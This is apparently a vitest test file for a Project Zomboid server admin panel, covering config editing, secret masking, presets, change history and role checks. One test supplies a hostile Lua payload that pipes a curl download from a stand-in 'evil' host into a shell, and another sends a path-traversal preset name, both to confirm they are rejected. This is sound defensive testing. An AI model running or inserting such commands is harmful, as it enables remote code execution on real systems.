import { copyFileSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { getPath, iniToRecord, parseIni, parseLuaData } from '@pz/formats';
import { MASK } from '../src/config/service';
import { fakeStatus, makePanel, ownerReady, type TestPanel } from './harness';

const fixtures = fileURLToPath(new URL('../../../fixtures/b42/config/', import.meta.url));

async function setup(opts: { withFiles?: boolean } = { withFiles: true }) {
  const p = await makePanel();
  const dir = path.join(p.deps.env.pzDataDir, 'Server');
  if (opts.withFiles) {
    mkdirSync(dir, { recursive: true });
    copyFileSync(path.join(fixtures, 'server.en.ini'), path.join(dir, 'zomboid.ini'));
    copyFileSync(path.join(fixtures, 'SandboxVars.en.lua'), path.join(dir, 'zomboid_SandboxVars.lua'));
    copyFileSync(path.join(fixtures, 'spawnregions.lua'), path.join(dir, 'zomboid_spawnregions.lua'));
  }
  const { client } = await ownerReady(p);
  return { p, c: client, dir };
}

const ini = (p: TestPanel) => iniToRecord(parseIni(readFileSync(p.deps.config.pathOf('ini'), 'utf8')));

describe('server settings (ini)', () => {
  it('reads values with secrets masked', async () => {
    const { c } = await setup();
    const r = (await c.get('/api/config/server')).json() as { values: Record<string, string>; missing: boolean };
    expect(r.missing).toBe(false);
    expect(r.values.PVP).toBe('true');
    expect(r.values.RCONPassword).toBe(MASK);
    expect(r.values.Password).toBe('');
  });

  it('edits values in place and keeps an untouched secret', async () => {
    const { p, c } = await setup();
    await c.req('PUT', '/api/config/server', { changes: { Password: 'unirse-2026' } });
    const r = await c.req('PUT', '/api/config/server', { changes: { PVP: 'false', MaxPlayers: '16', Password: MASK } });
    expect(r.json()).toEqual({ applied: 'next-start', warnings: [], restartNeeded: false });
    expect(ini(p)).toMatchObject({ PVP: 'false', MaxPlayers: '16', Password: 'unirse-2026', RCONPassword: '<RCON_PASSWORD>' });
    // The audit log never stores the secret.
    expect(p.deps.audit.list({ action: 'config.server' })[1]!.detail).toContain('<hidden>');
  });

  it('validates against the bilingual metadata and refuses managed or unknown keys', async () => {
    const { c } = await setup();
    const r = await c.req('PUT', '/api/config/server', { changes: { SafetyToggleTimer: '5000', PVP: 'maybe', RCONPort: '1', Nope: '1', PublicName: 'x\ny' } });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toMatchObject({
      error: 'invalid-options',
      fields: { SafetyToggleTimer: 'must be at most 1000', PVP: 'must be true or false', RCONPort: 'managed', Nope: 'unknown-option', PublicName: 'must be a single line' },
    });
  });

  it('applies live on a running server and reports options the game rejected', async () => {
    const { p, c } = await setup();
    p.feed.status_ = fakeStatus({ state: 'running' });
    p.agent.command = async (cmd) => {
      p.agent.calls.push(`command:${cmd}`);
      // What 42.20.4 logs for a value it can't parse.
      p.feed.emit({ type: 'log', stream: 'out', line: 'LOG  : General      f:0 st:1> ERROR IntegerConfigOption.parse() "ChatMessageSlowModeTime" string="abc"' });
      return { via: 'rcon', output: '' };
    };
    const r = (await c.req('PUT', '/api/config/server', { changes: { PVP: 'false', PublicName: 'Zombies Jatisheados' } })).json() as { applied: string; warnings: string[]; restartNeeded: boolean };
    expect(p.agent.calls).toContain('command:reloadoptions');
    expect(r).toEqual({ applied: 'live', warnings: ['ChatMessageSlowModeTime: abc'], restartNeeded: true });
    expect((await c.get('/api/config/pending')).json()).toMatchObject({ reasons: ['PublicName'] });
  });

  it('refuses writes while the server is booting', async () => {
    const { p, c } = await setup();
    p.feed.status_ = fakeStatus({ state: 'starting' });
    expect((await c.req('PUT', '/api/config/server', { changes: { PVP: 'false' } })).json()).toEqual({ error: 'server-busy' });
  });

  it('keeps managed keys from disk on raw edits and hides the RCON password', async () => {
    const { p, c } = await setup();
    const raw = ((await c.get('/api/config/server/raw')).json() as { text: string }).text;
    expect(raw).toContain('RCONPassword=<managed>');
    const edited = raw.replace('PVP=true', 'PVP=false').replace('DefaultPort=16261', 'DefaultPort=1');
    await c.req('PUT', '/api/config/server/raw', { text: edited });
    expect(ini(p)).toMatchObject({ PVP: 'false', DefaultPort: '16261', RCONPassword: '<RCON_PASSWORD>' });
  });

  it('seeds a first-run ini before the first start', async () => {
    const { p, c } = await setup({ withFiles: false });
    expect((await c.get('/api/config/server')).json()).toEqual({ values: {}, missing: true });
    await c.post('/api/server/start');
    await p.deps.ops.idle();
    expect(ini(p)).toEqual({ SaveWorldEveryMinutes: '10' });
  });
});

describe('sandbox', () => {
  it('reads and edits nested options by path', async () => {
    const { p, c } = await setup();
    const r = (await c.get('/api/config/sandbox')).json() as { values: Record<string, unknown> };
    expect(r.values['ZombieLore.Speed']).toBe(4);
    const put = await c.req('PUT', '/api/config/sandbox', { changes: { 'ZombieLore.Speed': 1, 'Map.AllowMiniMap': true, 'MultiplierConfig.Global': 2.5 } });
    expect(put.statusCode).toBe(200);
    const f = parseLuaData(readFileSync(p.deps.config.pathOf('sandbox'), 'utf8'));
    expect(getPath(f.table, 'ZombieLore.Speed')!.value).toMatchObject({ value: 1 });
    expect(getPath(f.table, 'MultiplierConfig.Global')!.value).toMatchObject({ raw: '2.5' });
    expect((await c.req('PUT', '/api/config/sandbox', { changes: { 'ZombieLore.Speed': 9 } })).json()).toMatchObject({ fields: { 'ZombieLore.Speed': 'is not one of the allowed choices' } });
  });

  it('rejects raw Lua that is not plain data', async () => {
    const { c } = await setup();
    const evil = 'SandboxVars = { Zombies = os.execute("curl evil | sh") }';
    const r = await c.req('PUT', '/api/config/sandbox/raw', { text: evil });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toMatchObject({ error: 'invalid-lua', line: 1 });
    expect((await c.req('PUT', '/api/config/spawnregions/raw', { text: 'SandboxVars = {}' })).json()).toMatchObject({ error: 'invalid-lua' });
  });

  it('applies a game preset onto the options the file has', async () => {
    const { p, c } = await setup();
    const presetDir = path.join(p.deps.env.pzInstallDir, 'media', 'lua', 'shared', 'Sandbox');
    mkdirSync(presetDir, { recursive: true });
    writeFileSync(path.join(presetDir, 'Apocalypse.lua'), 'return {\n    Version = 6,\n    Zombies = 1,\n    NotAnOption = 3,\n    ZombieLore = { Speed = 3, },\n}\n');
    expect(((await c.get('/api/config/meta')).json() as { presets: string[] }).presets).toEqual(['Apocalypse']);
    const r = (await c.post('/api/config/sandbox/presets/Apocalypse')).json() as { applied_keys: number };
    expect(r.applied_keys).toBe(2);
    const v = ((await c.get('/api/config/sandbox')).json() as { values: Record<string, unknown> }).values;
    expect(v).toMatchObject({ Zombies: 1, 'ZombieLore.Speed': 3 });
    expect((await c.post('/api/config/sandbox/presets/..%2F..%2Fetc')).statusCode).toBe(404);
  });
});

describe('history', () => {
  it('records every change and reverts one, masking secrets in the view', async () => {
    const { p, c } = await setup();
    await c.req('PUT', '/api/config/server', { changes: { PVP: 'false' } });
    await c.req('PUT', '/api/config/server', { changes: { MaxPlayers: '8' } });
    const h = (await c.get('/api/config/history?file=ini')).json() as { id: number; note: string; username: string | null }[];
    // The pre-existing file is captured before the first panel edit.
    expect(h.map((x) => x.note)).toEqual(['changed MaxPlayers', 'changed PVP', 'on disk before this change']);
    const v = (await c.get(`/api/config/history/${h[0]!.id}`)).json() as { content: string; previous: string };
    expect(v.content).toContain(`RCONPassword=${MASK}`);
    expect(v.previous).toContain('MaxPlayers=16');
    await c.post(`/api/config/history/${h[1]!.id}/revert`);
    expect(ini(p)).toMatchObject({ PVP: 'false', MaxPlayers: '16', RCONPassword: '<RCON_PASSWORD>' });
  });

  it('is admin-only', async () => {
    const { p, c } = await setup();
    await c.post('/api/users', { username: 'op1', password: 'Temporal-12345', role: 'operator' });
    const { Client } = await import('./harness');
    const op = new Client(p.app);
    await op.post('/api/auth/login', { username: 'op1', password: 'Temporal-12345' });
    await op.post('/api/auth/password', { current: 'Temporal-12345', next: 'Operador-propio-1' });
    expect((await op.get('/api/config/server')).statusCode).toBe(403);
    expect((await op.get('/api/config/pending')).statusCode).toBe(200);
  });
});
